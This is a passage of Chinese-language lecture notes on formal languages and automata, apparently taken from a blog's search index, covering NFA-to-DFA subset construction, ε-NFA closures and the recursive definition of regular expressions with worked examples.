L(N)$</p>\n<p>证明：对$|w|$用归纳法，往证：$\\hat\\delta_D( \\lbrace q_0 \\rbrace,w) = \\hat\\delta_N(q_0,w)$</p>\n<ul>\n<li>归纳基础：当$|w|=0$，即$w=\\epsilon$：</li>\n</ul>\n<script type=\"math/tex; mode=display\">\n\\hat\\delta_D(\\lbrace q_0 \\rbrace, \\epsilon) = \\lbrace q_0 \\rbrace = \\hat\\delta_N(q_0, \\epsilon)</script><ul>\n<li>归纳假设：假设$|w|=n$，命题成立</li>\n<li>归纳地推：当$|w|=n+1$则$w=xa (a \\in \\Sigma)$</li>\n</ul>\n<script type=\"math/tex; mode=display\">\n\\begin{aligned}\n\\hat\\delta_N(q_0,xa) & = \\bigcup_{p \\in \\hat\\delta_N(q_0,x)} \\delta_N(p,a) \\\\\n & = \\bigcup_{p \\in \\hat\\delta_D(\\lbrace q_0 \\rbrace, x)} \\delta_N(p,a) \\\\\n & = \\delta_D( \\hat\\delta_D(\\lbrace q_0 \\rbrace,x), a) \\\\\n & = \\hat\\delta_D(\\lbrace q_0 \\rbrace, xa)\n\\end{aligned}</script><p>因为$\\hat\\delta_D(\\lbrace q_0 \\rbrace, w) = \\hat\\delta_N(q_0, w)$，所以：</p>\n<script type=\"math/tex; mode=display\">\n\\begin{aligned}\nw \\in L(N) & \\iff \\hat\\delta_N(q_0,w) \\cap F_N \\not = \\emptyset \\\\\n & \\iff \\hat\\delta_D(\\lbrace q_0 \\rbrace, w) \\cap F_N \\not = \\emptyset \\\\\n & \\iff w \\in L(D)\n\\end{aligned}</script><p>所以$L(D) = L(N)$</p>\n<p>NFA和DFA的读头只能向一侧移动，如果读头可以向两侧移动，那就是一个图灵机。DFA和NFA在识别语言的<strong>能力上是等价</strong>的，在识别语言的效率上是否一致还是位置的（$P=NP$)</p>\n<p>子集构造法：</p>\n<p>例：接受全部以01结尾的串的NFA</p>\n<p>状态转移图和状态转移表如下：</p>\n<p><img src=\"11.png\" alt=\"\"></p>\n<div class=\"table-container\">\n<table>\n<thead>\n<tr>\n<th></th>\n<th>0</th>\n<th>1</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>$\\to q_0$</td>\n<td>$\\lbrace q_0,q_1 \\rbrace$</td>\n<td>$\\lbrace q_0 \\rbrace$</td>\n</tr>\n<tr>\n<td>$q_1$</td>\n<td>$\\emptyset$</td>\n<td>$\\lbrace q_2 \\rbrace $</td>\n</tr>\n<tr>\n<td>$* q_2$</td>\n<td>$\\emptyset$</td>\n<td>$\\emptyset$</td>\n</tr>\n</tbody>\n</table>\n</div>\n<p>转化为DFA，先构造对应DFA状态转移表，过程如下：首先把第一行初始状态$\\q_0$写成集合$\\lbrace q_0 \\rbrace$，对应右侧状态不变。此时DFA的状态集为：$\\lbrace \\lbrace q_0 \\rbrace, \\lbrace q_0,q_1 \\rbrace \\rbrace$，此时产生了新的状态$\\lbrace q_0,q_1 \\rbrace$。把新状态$\\lbrace q_0,q_1 \\rbrace$对应的转移规则写入第二列，分别为$\\lbrace q_0,q_1 \\rbrace$和$\\lbrace q_0,q_2 \\rbrace $，此时产生了新的状态$\\lbrace q_0,q_2 \\rbrace $。把新的状态$\\lbrace q_0,q_2 \\rbrace $写入第三行，对应的转移状态是$\\lbrace q_0,q_1 \\rbrace$和$\\lbrace q_0 \\rbrace$，此时不再出现新的状态，完成。完整转移状态表如下：</p>\n<div class=\"table-container\">\n<table>\n<thead>\n<tr>\n<th></th>\n<th>0</th>\n<th>1</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>$\\to \\lbrace q_0 \\rbrace$</td>\n<td>$\\lbrace q_0,q_1 \\rbrace$</td>\n<td>$\\lbrace q_0 \\rbrace$</td>\n</tr>\n<tr>\n<td>$\\lbrace q_0, q_1 \\rbrace$</td>\n<td>$\\lbrace q_0,q_1 \\rbrace$</td>\n<td>$\\lbrace q_0,q_2 \\rbrace $</td>\n</tr>\n<tr>\n<td>$* \\lbrace q_0,q_2 \\rbrace$</td>\n<td>$\\lbrace q_0,q_1 \\rbrace$</td>\n<td>$\\lbrace q_0 \\rbrace$</td>\n</tr>\n</tbody>\n</table>\n</div>\n<p>画出对应的状态转移图如下：</p>\n<p><img src=\"14.png\" alt=\"\"></p>\n<p>例：设计DFA识别$L=\\lbrace w \\in \\lbrace 0,1 \\rbrace ^ * | w \\text{倒数第3个字符是1} \\rbrace$</p>\n<p>要写出对应的DFA很困难，但是先写出对应的NFA则很简单，NFA的确可以起到简化有限状态机的设计的作用。先画出的NFA状态如下：<br><img src=\"15.png\" alt=\"\"></p>\n<p>再写出对应的NFA状态转移表</p>\n<div class=\"table-container\">\n<table>\n<thead>\n<tr>\n<th></th>\n<th>0</th>\n<th>1</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>$\\to q_0 $</td>\n<td>$\\lbrace q_0 \\rbrace$</td>\n<td>$\\lbrace q_0,q_1 \\rbrace$</td>\n</tr>\n<tr>\n<td>$ q_1 $</td>\n<td>$\\lbrace q_2 \\rbrace$</td>\n<td>$\\lbrace q_2 \\rbrace $</td>\n</tr>\n<tr>\n<td>$ q_2 $</td>\n<td>$\\lbrace q_3 \\rbrace$</td>\n<td>$\\lbrace q_3 \\rbrace$</td>\n</tr>\n<tr>\n<td>$* q_3 $</td>\n<td>$\\emptyset$</td>\n<td>$\\emptyset$</td>\n</tr>\n</tbody>\n</table>\n</div>\n<p>然后写出NFA转DFA的状态转移图</p>\n<ul>\n<li>带有空转移的非确定有穷自动机</li>\n<li>$\\epsilon-$闭包</li>\n<li>扩展转移函数与$\\epsilon-$NFA的语言</li>\n<li>$\\epsilon-$NFA与DFA等价性</li>\n</ul>\n<p><img src=\"18.png\" alt=\"\"></p>\n<ul>\n<li>允许状态因空串$\\epsilon$而转移，即不消耗输入字符串就发生状态的改变</li>\n<li>进一步简化自动机的设w计</li>\n</ul>\n<p>定义：带空转移非确定有穷自动机($\\epsilon$-NFA)，A为五元组：</p>\n<script type=\"math/tex; mode=display\">\nA = (Q,\\Sigma,\\delta,q_0,F)</script><ul>\n<li>$Q$：有穷状态集</li>\n<li>$\\Sigma$：有穷输入符号集/字母表</li>\n<li>$\\delta:Q × (\\Sigma \\cup \\lbrace \\epsilon \\rbrace)\\to 2^Q$，状态转移函数</li>\n<li>$q_0 \\in Q$：初始状态</li>\n<li>$F \\subseteq Q$：终结状态集或接受状态集</li>\n</ul>\n<p>例：设计$L=\\lbrace w \\in \\lbrace 0,1 \\rbrace^{\\ast} | \\text{$w$倒数3个字符至少有一个是1} \\rbrace$的NFA</p>\n<p>可以利用之前的例子，增加几个接收状态即可：<br><img src=\"16.png\" alt=\"\"><br>也可以利用NFA多转移的特性，画出这样的转移状态图：<br><img src=\"17.png\" alt=\"\"><br>使用空转移可以进一步简化设计：<br><img src=\"19.png\" alt=\"\"><br>对应的状态转移表：</p>\n<div class=\"table-container\">\n<table>\n<thead>\n<tr>\n<th></th>\n<th>0</th>\n<th>1</th>\n<th>$\\epsilon$</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>$\\to q_0$</td>\n<td>$\\lbrace q_0 \\rbrace$</td>\n<td>$\\lbrace q_0,q_1 \\rbrace$</td>\n<td>$\\emptyset$</td>\n</tr>\n<tr>\n<td>$q_1$</td>\n<td>$\\lbrace q_2 \\rbrace$</td>\n<td>$\\lbrace q_2 \\rbrace$</td>\n<td>$\\lbrace q_2 \\rbrace$</td>\n</tr>\n<tr>\n<td>$q_2$</td>\n<td>$\\lbrace q_3 \\rbrace$</td>\n<td>$\\lbrace q_3 \\rbrace$</td>\n<td>$\\lbrace q_3 \\rbrace$</td>\n</tr>\n<tr>\n<td>$*q_3$</td>\n<td>$\\emptyset$</td>\n<td>$\\emptyset$</td>\n<td>$\\emptyset$</td>\n</tr>\n</tbody>\n</table>\n</div>\n<p>自动机在某个状态，当读入某个字符，NFA和$\\epsilon$-NFA可能有多个转移，NFA，$\\epsilon$-NFA，DFA也可能都没有转移；当不读入字符时候就发生了转移，就一定是$\\epsilon$-NFA。</p>\n<blockquote>\n<p>$\\epsilon$-NFA是一种特殊的NFA，后续的NFA，一般指的都是$\\epsilon$-NFA</p>\n</blockquote>\n<p>当输入字符串是011时，$\\epsilon$-NFA的状态变化如下：<br><img src=\"21.png\" alt=\"\"><br>当某个状态有空转移的时候，需要考虑<em>通过空转移能到的所有状态</em>。这种对于当前状态，<strong>补充和扩展</strong>所有空转移到达的状态的，数学上定义就是<strong>闭包</strong>。</p>\n<p>状态的闭包<br>定义：状态$q$的$\\epsilon-\\text{闭包}$（$\\epsilon-Closure$）记为：$E_{CLOSE}(q)$，表示从$q$经过$\\epsilon\\epsilon…\\epsilon$序列可达的全部状态集合，递归定义为：</p>\n<ul>\n<li>$q \\in E_{CLOSE}(q)$</li>\n<li>$\\forall p \\in E<em>{CLOSE}(q)$，若$r \\in \\delta(p,\\epsilon)$，则$r \\in E</em>{CLOSE}(q)$</li>\n</ul>\n<p>对与如下状态转移图，求闭包：<br><img src=\"20.png\" alt=\"\"></p>\n<div class=\"table-container\">\n<table>\n<thead>\n<tr>\n<th></th>\n<th>$E_{CLOSE}(p)$</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>1</td>\n<td>$\\lbrace 1,2,3,4,5 \\rbrace $</td>\n</tr>\n<tr>\n<td>2</td>\n<td>$\\lbrace 2,3,4 \\rbrace $</td>\n</tr>\n<tr>\n<td>3</td>\n<td>$\\lbrace 3,4 \\rbrace $</td>\n</tr>\n<tr>\n<td>4</td>\n<td>$\\lbrace 4 \\rbrace $</td>\n</tr>\n<tr>\n<td>5</td>\n<td>$\\lbrace 5 \\rbrace $</td>\n</tr>\n<tr>\n<td>6</td>\n<td>$\\lbrace 6,7 \\rbrace $</td>\n</tr>\n<tr>\n<td>7</td>\n<td>$\\lbrace 7 \\rbrace $</td>\n</tr>\n</tbody>\n</table>\n</div>\n<blockquote>\n<p>需要注意状态的闭包一定包含自身！</p>\n</blockquote>\n<p>集合的闭包：<br>定义：状态集$S$的$\\epsilon$-闭包为：</p>\n<script type=\"math/tex; mode=display\">\nE_{CLOSE}(S) = \\bigcup_{q \\in S}E_{CLOSE}(q)</script><p>即状态集中状态闭包的并集。</p>\n<p>$\\epsilon$-NFA的扩展转移函数：<br>定义：扩展$\\delta$到字符串，定义扩展转移函数$\\hat\\delta:Q × \\Sigma^{\\ast} → 2^Q$为：</p>\n<script type=\"math/tex; mode=display\">\n\\hat\\delta(q,w) = \n\\begin{cases}\nE_{CLOSE}(q) & w = \\epsilon \\\\\nE_{CLOSE}(\\bigcup_{p \\in \\hat\\delta(q,x)}\\delta(p,a)) & w = xa \\\\\n\\end{cases}</script><p>其中$a \\in \\Sigma$，$w,x \\in \\Sigma*$</p>\n<p>续例：例：$L=\\lbrace w \\in \\lbrace 0,1 \\rbrace^{\\ast} | \\text{$w$倒数3个字符至少有一个是1} \\rbrace$的NFA下，求$\\hat\\delta(q_0,10)$=?<br><img src=\"19.png\" alt=\"\"><br>根据扩展转移函数的定义：</p>\n<script type=\"math/tex; mode=display\">\n\\begin{aligned}\n\\hat\\delta(q_0, \\epsilon) & = E_{CLOSE}(q_0) = \\lbrace q_0 \\rbrace \\\\\n\n\\hat\\delta(q_0,1) & = E_{CLOSE}(\\bigcup_{p \\in \\hat\\delta(q_0,\\epsilon)} \\delta(p,1) \\\\\n & = E_{CLOSE}(\\hat\\delta(q_0,1) = E_{CLOSE}(\\lbrace q_0,q_1 \\rbrace) = \\lbrace q_0,q_1,q_2,q_3 \\rbrace \\\\\n\n\\hat\\delta(q_0,10) & = E_{CLOSE}(\\bigcup_{p \\in \\hat\\delta(q_0,1)} \\delta(p,0)) \\\\\n & = E_{CLOSE}(\\delta(q_0,0) \\cup \\delta(q_1,0) \\cup \\delta(q_2,0) \\cup \\delta(q_3,0)) \\\\\n & = E_{CLOSE}(\\lbrace q_0, q_2, q_3 \\rbrace) = \\lbrace q_0,q_2,q_3 \\rbrace\n\\end{aligned}</script><p>若$E = (Q, \\Sigma, \\delta, q_0, F)$是一个$\\epsilon$-NFA，则$E$接受的语言为：</p>\n<script type=\"math/tex; mode=display\">\nL(E) = \\lbrace w \\in \\Sigma^{\\ast} | \\hat\\delta(q_0,w) \\cap F \\not= \\emptyset \\rbrace</script><p>构造与$\\epsilon-$NFA等价的DFA：<br>子集构造法（$\\epsilon-$NFA消除空转移）<br>如果$\\epsilon-$NFA $E = (Q_E, \\Sigma, \\delta_E, q_E, F_E)$，构造DFA</p>\n<script type=\"math/tex; mode=display\">\nD = (Q_D, \\Sigma, \\delta_D, q_D, F_D)</script><ul>\n<li>$ Q<em>D = 2^{Q_E} $，或 $ Q_D = \\lbrace S \\vert S \\subseteq Q_E | S = E</em>{CLOSE}(S) \\rbrace $  </li>\n<li>$ q<em>D = E</em>{CLOSE}(q_E) $</li>\n<li>$ F_D = \\lbrace S | S \\in Q_D, S \\cap F_E \\not= \\emptyset \\rbrace$</li>\n<li>$ \\forall S \\in Q_D, \\forall a \\in \\Sigma $</li>\n</ul>\n<script type=\"math/tex; mode=display\">\n\\delta_D(S,a) = E_{CLOSE}(\\bigcup_{p \\in S} \\delta_E(p,a))</script><p>那么$L(D)=L(E)$</p>\n<p>求上例$\\epsilon-$NFA对应的DFA，先列出NFA的状态转移表和闭包：</p>\n<div class=\"table-container\">\n<table>\n<thead>\n<tr>\n<th></th>\n<th>0</th>\n<th>1</th>\n<th>$\\epsilon$</th>\n<th>$E_{CLOSE}$</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>$\\to q_0$</td>\n<td>$\\lbrace q_0 \\rbrace $</td>\n<td>$\\lbrace q_0,q_1 \\rbrace $</td>\n<td>$\\emptyset$</td>\n<td>$\\lbrace q_0 \\rbrace $</td>\n</tr>\n<tr>\n<td>$q_1$</td>\n<td>$\\lbrace q_2 \\rbrace $</td>\n<td>$\\lbrace q_2 \\rbrace $</td>\n<td>$\\lbrace q_2 \\rbrace$</td>\n<td>$\\lbrace q_1,q_2,q_3 \\rbrace $</td>\n</tr>\n<tr>\n<td>$q_2$</td>\n<td>$\\lbrace q_3 \\rbrace $</td>\n<td>$\\lbrace q_3 \\rbrace $</td>\n<td>$\\lbrace q_3 \\rbrace$</td>\n<td>$\\lbrace q_2,q_3 \\rbrace $</td>\n</tr>\n<tr>\n<td>$*q_3$</td>\n<td>$\\emptyset$</td>\n<td>$\\emptyset$</td>\n<td>$\\emptyset$</td>\n<td>$\\lbrace q_3 \\rbrace$</td>\n</tr>\n</tbody>\n</table>\n</div>\n<p>求对应$\\epsilon$-NFA状态转移表过程和求NFA的状态转移表过程类似。从开始状态起，把$q_0$写成|$\\lbrace q_0 \\rbrace$，区别的是，对于返回状态还需求一次闭包。从上至下，从左至右求，最后因为$q_3$是接受状态，所以把带有$q_3$的都标记为接收状态。结果如下：</p>\n<div class=\"table-container\">\n<table>\n<thead>\n<tr>\n<th></th>\n<th>0</th>\n<th>1</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>$\\to \\lbrace q_0 \\rbrace$</td>\n<td>$\\lbrace q_0 \\rbrace $</td>\n<td>$\\lbrace q_0,q_1,q_2,q_3 \\rbrace $</td>\n</tr>\n<tr>\n<td>$*\\lbrace q_0,q_1,q_2,q_3 \\rbrace $</td>\n<td>$\\lbrace q_0,q_2,q_3 \\rbrace $</td>\n<td>$\\lbrace q_0,q_1,q_2,q_3 \\rbrace $</td>\n</tr>\n<tr>\n<td>$*\\lbrace q_0,q_2,q_3 \\rbrace $</td>\n<td>$\\lbrace q_0,q_3 \\rbrace $</td>\n<td>$\\lbrace q_0,q_1,q_2,q_3q_2,q_3 \\rbrace $</td>\n</tr>\n<tr>\n<td>$*\\lbrace q_0,q_3 \\rbrace $</td>\n<td>$\\lbrace q_0 \\rbrace $</td>\n<td>$\\lbrace q_0,q_1,q_2,q_3 \\rbrace $</td>\n</tr>\n</tbody>\n</table>\n</div>\n<p>定理：如果语言$L$被$\\epsilon$-NFA接受，当且仅当$L$被DFA接受。<br>证明：必要性显然成立，因为任何DFA都是$\\epsilon-$NFA。下面证明充分性，对$w$归纳，往证$\\hat\\delta_E(q_E,w) = \\hat\\delta_D(q_D,w)$</p>\n<ul>\n<li>当$w = \\epsilon$时<script type=\"math/tex; mode=display\">\n\\hat\\delta_E(q_E,\\epsilon) = E_{CLOSE}(q_E) = q_D = \\hat\\delta_D(q_D,\\epsilon)</script></li>\n<li>当$w = xa$时<script type=\"math/tex; mode=display\">\n\\begin{aligned}\n\\delta_E(q_E,xa) & = E_{CLOSE}(\\bigcup_{p \\in \\hat\\delta_E(q_E,x)} \\delta_E(p,a)) \n= E_{CLOSE}(\\bigcup_{p \\in \\hat\\delta_D(q_D,x)}\\delta_E(p,a)）\\\\\n& = \\delta_D(\\hat\\delta_D(q_D,x),a) = \\hat\\delta_D(q_D,xa)\n\\end{aligned}</script></li>\n</ul>\n<p>例：设计一个$\\epsilon-$NFA，接受语言：$\\lbrace 0^k | k是2或3的倍数$</p>\n<p>即设计一个$\\epsilon-$NFA接受长度为2或3的倍数的’0’串，对于这种两个或条件的，可以分别设计接受2的倍数0串的$\\epsilon-$NFA和接受3的倍数0串的$\\epsilon-$NFA，再用空转移的特性把他们合并起来：<br><img src=\"22.png\" alt=\"\"></p>\n","categories":["形式语言与自动机理论"],"tags":["形式语言与自动机理论"]},{"title":"形式语言与自动机理论（2）正则表达式","url":"/2021/01/22/%E5%BD%A2%E5%BC%8F%E8%AF%AD%E8%A8%80%E4%B8%8E%E8%87%AA%E5%8A%A8%E6%9C%BA%E7%90%86%E8%AE%BA%EF%BC%882%EF%BC%89%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/","content":"<h1 id=\"正则表达式\"><a href=\"#正则表达式\" class=\"headerlink\" title=\"正则表达式\"></a>正则表达式</h1><ul>\n<li>$\\to$正则表达式<ul>\n<li>正则表达式的递归定义</li>\n<li>正则表达式实例</li>\n</ul>\n</li>\n<li>自动机和正则表达式</li>\n<li>正则表达式的代数定理</li>\n</ul>\n<ul>\n<li>有穷自动机<ul>\n<li>通过机器装置描述正则语言</li>\n<li>用计算机编写相应算法，用于实现</li>\n</ul>\n</li>\n<li><p>正则表达式</p>\n<ul>\n<li>通过表达式描述正则语言，代数表示方法，使用方便</li>\n<li>应用广泛<ul>\n<li>grep工具（Global Regular Expression and Print)</li>\n<li>Emacs/Vim文本编辑器</li>\n<li>lex/flex词法分析器</li>\n<li>各种程序设计语言Python/Perl/Haskell…</li>\n</ul>\n</li>\n</ul>\n<blockquote>\n<p>本文正则表达式并非POSIX正则表达式，只是一种形式化的表示</p>\n<span id=\"more\"></span>\n</blockquote>\n</li>\n</ul>\n<p>语言的运算：<br>设$L$和$M$是两个语言，那么：</p>\n<script type=\"math/tex; mode=display\">\n\\begin{aligned}\n\\text{并} \\  L \\cup M & = \\lbrace w | w \\in L 或 w \\in M \\rbrace \\\\\n\\text{连接} \\  L \\cdot M & = \\lbrace w | w = xy,x \\in L \\text{且} y \\in M \\rbrace \\\\\n\\text{幂} \\  L^0 & = \\lbrace \\epsilon \\rbrace \\\\\n\\text{}  L^1 & = L \\\\\n\\text{}  L^n & = L^{n-1} \\cdot L \\\\\n\\text{克林闭包} \\  L^{\\ast} & = \\bigcup_{i=0}^\\infty L^i \\\\\n\\end{aligned}</script><p>例：若有语言$L = \\lbrace 0,11 \\rbrace$ 和 $M = \\lbrace \\epsilon, 001 \\rbrace$，那么：</p>\n<script type=\"math/tex; mode=display\">\n\\begin{aligned}\nL \\cup M & = \\lbrace 0,11,001,\\epsilon \\rbrace \\\\\nLM & = \\lbrace 0,0001,11,11001 \\rbrace \\\\\nML & = \\lbrace 0,11,0010,00111 \\rbrace \\\\\nL^0 & = \\lbrace \\epsilon \\rbrace \\\\\nL^1 & = \\lbrace 0,11 \\rbrace \\\\\nL^2 & = \\lbrace 00,011,110,1111 \\rbrace \\\\\n\\end{aligned}</script><p>例：对于空语言$\\emptyset$，$\\lbrace \\epsilon \\rbrace$，字母表$\\Sigma$，$\\Sigma^{\\ast}$</p>\n<script type=\"math/tex; mode=display\">\n\\forall n \\geq 1 \\text{,}\n\\begin{cases}\n\\emptyset^0 &  \\lbrace \\epsilon \\rbrace \\\\\n\\emptyset^n &  \\emptyset \\\\\n\\emptyset^{\\ast} &  \\lbrace \\epsilon \\rbrace \\\\\n\\end{cases}</script><script type=\"math/tex; mode=display\">\n\\begin{cases}\n\\lbrace \\epsilon \\rbrace ^ 0 & = \\lbrace \\epsilon \\rbrace \\\\\n\\lbrace \\epsilon \\rbrace ^ n & = \\lbrace \\epsilon \\rbrace \\\\\n\\lbrace \\epsilon \\rbrace ^ * & = \\lbrace \\epsilon \\rbrace \\\\\n\\end{cases}</script><script type=\"math/tex; mode=display\">\n\\begin{cases}\n\\Sigma ^ 0 & = \\lbrace \\epsilon \\rbrace \\\\\n\\Sigma ^ n & = \\lbrace x | x \\text{是} \\Sigma \\text{上长为} n \\text{的串} \\rbrace \\\\\n\\Sigma ^ * & = \\lbrace x | x \\text{是} \\Sigma \\text{上长为任意长度的串} \\rbrace \\\\\n\\end{cases}</script><script type=\"math/tex; mode=display\">\n\\begin{cases}\n\\lbrace \\Sigma^{\\ast} \\rbrace ^ 0 & = \\lbrace \\epsilon \\rbrace \\\\\n\\lbrace \\Sigma^{\\ast} \\rbrace ^ n & = \\lbrace \\Sigma^{\\ast} \\rbrace \\\\\n\\lbrace \\Sigma^{\\ast} \\rbrace ^ * & = \\lbrace \\Sigma^{\\ast} \\rbrace \\\\\n\\end{cases}</script><p>四则运算表达式的递归定义</p>\n<ul>\n<li>任何数都是四则运算表达式</li>\n<li>如果$a$和$b$是四则运算表达式，那么<script type=\"math/tex; mode=display\">\na+b,a-b,a \\times b, a \\div b, (a)</script>都是四则运算表达式</li>\n</ul>\n<p>正则表达式的递归定义：<br>如果$\\Sigma$是字母表，则$\\Sigma$上的正则表达式递归定义为：</p>\n<ul>\n<li>$\\emptyset$是一个正则表达式，表示空语言</li>\n<li>$\\epsilon$是一个正则表达式，表示语言$\\lbrace \\epsilon \\rbrace$</li>\n<li>$\\forall a \\in \\Sigma$，$a$是一个正则表达式，表示语言$\\lbrace a \\rbrace$</li>\n<li>如果正则表达式$\\boldsymbol{r}$和$\\boldsymbol{s}$分别表示语言$R$和$S$，那么：<script type=\"math/tex; mode=display\">\n\\boldsymbol{r} + \\boldsymbol{s}, \\boldsymbol{rs}, \\boldsymbol{r}^{\\ast}, (\\boldsymbol{r})</script>都是正则表达式，分别表示语言：<script type=\"math/tex; mode=display\">\nR \\cup S, R \\cdot S, R^{\\ast}, R</script></li>\n</ul>\n<p>正则表达式中三总运算以及括号的优先级：</p>\n<ul>\n<li>首先，“括号”的优先级最高</li>\n<li>其次，“星”运算：$\\boldsymbol{r}^{\\ast}$</li>\n<li>然后，“连接运算”,$\\boldsymbol{rs}$,$\\boldsymbol{r} \\cdot \\boldsymbol{s}$</li>\n<li>最后，“加”最低，$\\boldsymbol{r} + \\boldsymbol{s}$,$\\boldsymbol{r} \\cup \\boldsymbol{s}$</li>\n</ul>\n<p>例：</p>\n<script type=\"math/tex; mode=display\">\n\\begin{aligned}\n1 + 01^{\\ast} & = 1 + (0(1^{\\ast})) = \\lbrace 1,0,01,011,00111,... \\rbrace \\\\\n & \\not = 1 + (01)^{\\ast} = \\lbrace 1,\\epsilon,01,0101,010101,... \\rbrace \\\\\n & \\not = (1 + 01)^{\\ast} = \\lbrace 1,01 \\rbrace ^ * \\\\\n & \\not = (1 + 0)1^{\\ast} =\\lbrace 1,0,11,01,111,011,1111,0111,... \\rbrace  \\\\\n\\end{aligned}</script><p>例:</p>\n<div class=\"table-container\">\n<table>\n<thead>\n<tr>\n<th>$E$</th>\n<th>$\\boldsymbol{L}(E)$</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>$\\boldsymbol{a} + \\boldsymbol{b}$</td>\n<td>$\\boldsymbol{L}(\\boldsymbol{a}) \\cup \\boldsymbol{L}(\\boldsymbol{b}) = \\lbrace a \\rbrace \\cup \\lbrace b \\rbrace = \\lbrace a,b \\rbrace$</td>\n</tr>\n<tr>\n<td>$ \\boldsymbol{bb} $</td>\n<td>$ \\boldsymbol{L}(\\boldsymbol{b}) \\cdot \\boldsymbol{L}(\\boldsymbol{b}) = \\lbrace b \\rbrace \\cdot \\lbrace b \\rbrace = \\lbrace bb \\rbrace $</td>\n</tr>\n<tr>\n<td>$ (\\boldsymbol{a} + \\boldsymbol{b})(\\boldsymbol{a} + \\boldsymbol{b}) $</td>\n<td>$ \\lbrace a,b \\rbrace \\lbrace a,b \\rbrace = \\lbrace aa,ab,ba,bb \\rbrace $</td>\n</tr>\n<tr>\n<td>$ (\\boldsymbol{a} + \\boldsymbol{b})^{\\ast}(\\boldsymbol{a} + \\boldsymbol{bb}) $</td>\n<td>$ \\lbrace a,b \\rbrace^{\\ast} \\lbrace a,bb \\rbrace = \\lbrace a,b \\rbrace^{\\ast} \\lbrace a \\rbrace \\cup \\lbrace a,b \\rbrace^{\\ast} \\lbrace bb \\rbrace = \\lbrace w \\in \\lbrace a,b \\rbrace^{\\ast} \\vert w \\text{仅以a或bb结尾} \\rbrace $</td>\n</tr>\n<tr>\n<td>$ \\boldsymbol{1} + (\\boldsymbol{01})^{\\ast} $</td>\n<td>$ \\lbrace 1, \\epsilon, 01,0101,010101,… \\rbrace  $</td>\n</tr>\n<tr>\n<td>$ (\\boldsymbol{0} + \\boldsymbol{1})^{\\ast} \\boldsymbol{01} (\\boldsymbol{0} + \\boldsymbol{1})^{\\ast} $</td>\n<td>$ \\lbrace x01y \\vert x,y \\in \\lbrace 0,1 \\rbrace^{\\ast} \\rbrace $</td>\n</tr>\n</tbody>\n</table>\n</div>\n<p>例：给出正则表达式$(\\boldsymbol{aa})^{\\ast} (\\boldsymbol{bb})^{\\ast} \\boldsymbol{b} $定义的语言</p>\n<script type=\"math/tex; mode=display\">\n\\begin{aligned}\n\\boldsymbol{L}((\\boldsymbol{aa})^{\\ast} (\\boldsymbol{bb})^{\\ast} \\boldsymbol{b}) & = \\boldsymbol{L}((\\boldsymbol{aa})^{\\ast}) \\cdot \\boldsymbol{L}((\\boldsymbol{bb})^{\\ast}) \\cdot \\boldsymbol{L}(\\boldsymbol{b}) \\\\\n& = (\\lbrace a \\rbrace \\lbrace a \\rbrace)^{\\ast}  (\\lbrace b \\rbrace \\lbrace b \\rbrace)^{\\ast} \\lbrace b \\rbrace \\\\\n& = \\lbrace a^2 \\rbrace \\cdot \\lbrace b^2 \\rbrace \\cdot \\lbrace b \\rbrace \\\\\n& = \\lbrace a^{2n}b^{2m+1} \\vert n \\geq 0, m \\geq 0 \\rbrace \\\\\n\\end{aligned}</script><p>例：给出正则表达式，$L = \\lbrace w | w \\subseteq \\lbrace 0,1 \\rbrace ^ {\\ast} \\text{且倒数第三个字符是1}$<br>如果是自动机器来描述，则很复杂，但正则表达式表示则很简洁：</p>\n<script type=\"math/tex; mode=display\">\n(\\boldsymbol{0} + \\boldsymbol{1})^{\\ast} \\vert \\boldsymbol{1} (\\boldsymbol{0} + \\boldsymbol{1}) (\\boldsymbol{0} + \\boldsymbol{1})</script><p>例：Design regular expression for $L = \\lbrace w \\vert w \\in \\lbrace 0,1 \\rbrace^{\\ast} \\text{and $w$ has no pair of consecutive 0’s} \\rbrace$<br>不允许出现连续的0，那么，就要0前后必有1，$(\\boldsymbol{1} + \\boldsymbol{01})^{\\ast}$，但是此时还不能表示0结尾的串，于是改为$(\\boldsymbol{1} + \\boldsymbol{01})^{\\ast} \\boldsymbol{0}$，但是此时又不能表示空串了，所以最终结果为：$(\\boldsymbol{1} + \\boldsymbol{01})^{\\ast} (\\boldsymbol{0} + \\epsilon)$</p>\n<ul>\n<li>$\\to$正则表达式</li>\n<li>自动机和正则表达式<ul>\n<li>由自动机到正则表达式</li>\n<li>由正则表达式到自动机</li>\n</ul>\n</li>\n<li>正则表达式的代数定理</li>\n</ul>\n<h2 id=\"DFA到正则表达式\"><a href=\"#DFA到正则表达式\" class=\"headerlink\" title=\"DFA到正则表达式\"></a>DFA到正则表达式</h2><p>DFA，NFA，$\\epsilon-$NFA和正则表达式在表示语言的能力上等价。<br><img src=\"23.png\" alt=\"\"></p>\n<ul>\n<li>任何NFA都可以不适用非确定性去模拟DFA，所以任何DFA表示的语言都可以被NFA识别；可以用子集构造法构造与NFA等价的DFA，所以任何NFA表示的语言都能被一个DFA表示，即NFA和DFA是等价的。</li>\n<li>任何$\\epsilon-$NFA可以不使用空转移和非确定性去模拟一个DFA，所以任何DFA表示的语言都可以被$\\epsilon-$NFA所表示；可以使用消除空转移的子集构造法构造与$\\epsilon-$NFA等价的DFA，所以任何$\\epsilon-$NFA表示的语言都能被一个DFA表示，即DFA和$\\epsilon-$NFA是等价的。</li>\n<li>任何DFA都可以构造一个和他等价的正则表达式，即任何DFA能表示的语言都能被一个正则表达式表示；任何正则表达式表示的语言，都能被一个$\\epsilon-$NFA识别，而DFA和$\\epsilon-$NFA是等价的。综上，有穷自动机和正则表达式是等价的。</li>\n</ul>\n<p>由DFA到正则表达式，可以用<strong>递归表达式法</strong>或<strong>状态消除法</strong>实现  </p>\n<h3 id=\"递归表达式法\"><a href=\"#递归表达式法\" class=\"headerlink\" title=\"递归表达式法\"></a>递归表达式法</h3><p>DFA能描述的语言，可以看成是起止节点之间的所有路径，用$R_{ij}$表示$i,j$两个节点之间的全部路径，可以递归的表示为：</p>\n<p><img src=\"24.png\" alt=\"\"></p>\n<script type=\"math/tex; mode=display\">\nR_{ij} = R_{ij}^{\\text{不经过k}} + R_{ik}^{\\text{不经过k}} 